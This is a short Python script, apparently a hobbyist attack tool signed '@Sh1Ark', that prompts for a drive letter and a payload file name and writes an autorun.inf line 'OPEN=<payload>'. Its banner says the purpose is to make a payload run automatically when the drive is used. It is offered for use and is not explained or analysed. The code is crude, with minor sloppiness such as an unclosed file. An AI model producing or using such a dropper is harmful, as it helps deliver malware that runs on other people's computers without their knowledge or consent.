
import os,time
class Runer():
    def banner(self):
        print("hello friends ,with this tool you can make an payload run automaticaly !")
        time.sleep(3)
        print("""

    ############################
     
              @Sh1Ark
    
    ############################
    """)
        os.system("cls")
        dev = input("Drive Letter  : ")
        os.chdir(dev)
        print("*Hint* Dont Forget You must put payload in drive ")
        
        p = input("Name Of Payload Please : ")
        if len(p) > 0:
            
            o = open('autorun.inf','w')
            
            o.write("OPEN={}".format(p))
        else:
            print("you must put a name or anything else !")
Runer().banner()
